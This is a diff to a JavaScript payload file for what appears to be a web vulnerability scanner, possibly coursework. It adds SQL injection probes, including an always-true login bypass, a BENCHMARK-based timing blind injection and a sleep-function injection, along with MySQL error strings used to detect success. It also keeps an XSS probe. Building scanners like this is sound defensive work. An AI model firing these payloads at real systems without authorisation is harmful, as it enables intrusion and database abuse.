@@ -269,15 +269,20 @@ var payload2 = [
      ,"Unknown MySQL error"
      ,"An error occured: DROP command"
      ,"An error occured: No database"
+     ,"An error occured: FUNCTION"
      ,"valid MySQL result"
      ,"on MySQL result index"
      ,"Column count doesn't match value count at row"
-     ,"Column count doesn't match"
      ,"supplied argument is not a valid MySQL"
      ,"Warning.*mysql_.*"]
     ],
     ["sql", "Login Field","sql2",
-     [["^.*username.*$","' or '1' = '1"]]
+     [["^.*username.*$","' or '1' = '1"]],
+     ["An error occured: "]
+    ],
+    ["sql", "Blind Injection (Timing)", "sql3",
+     [["*", "1'; SELECT BENCHMARK(100000000,RAND());#"]],
+     ["An error occured: FUNCTION"]
     ],
     ["xss", "Test for vulnerability","xss1",
      [["*","<div id='w1231' href='w1231' src='w1231'></div>"]],
@@ -313,7 +318,7 @@ var payload2 = [
 
 var payload = [ 
     ["sql", "Test for vulnerability", "sql1",
-     [["*","';--"],["*","'--"],["*","1'1"], ["*", "1\'"], ["*","a\'"], ["*","98765432\'"], ["*","5432\'"], ["*",";"]],
+     [["*","';--"],["*","'--"],["*","1'1"], ["*", "1\'"], ["*","a\'"], ["*","98765432\'"], ["*","5432\'"], ["*",";"], ["*","1' AND cs2107_sleep(15) IS NULL;#"]],
      ["An error occured: You have an error"
      ,"check the manual that corresponds to your MySQL server version"
      ,"You have an error in your SQL syntax;"
@@ -322,14 +327,16 @@ var payload = [
      ,"Unknown MySQL error"
      ,"An error occured: DROP command"
      ,"An error occured: No database"
+     ,"An error occured: FUNCTION"
      ,"valid MySQL result"
-     ,"on MySQL result index","Column count doesn't match value count at row"
-     ,"Column count doesn't match"
+     ,"on MySQL result index"
+     ,"Column count doesn't match value count at row"
      ,"supplied argument is not a valid MySQL"
      ,"Warning.*mysql_.*"]
     ],
     ["sql", "Login Field","sql2",
-     [["^.*username.*$","' or '1' = '1"]]
+     [["^.*username.*$","' or '1' = '1"]],
+     ["An error occured: "]
     ],
     ["xss", "Test for vulnerability","xss1",
      [["*","<div id='w1231' href='w1231' src='w1231'></div>"]],
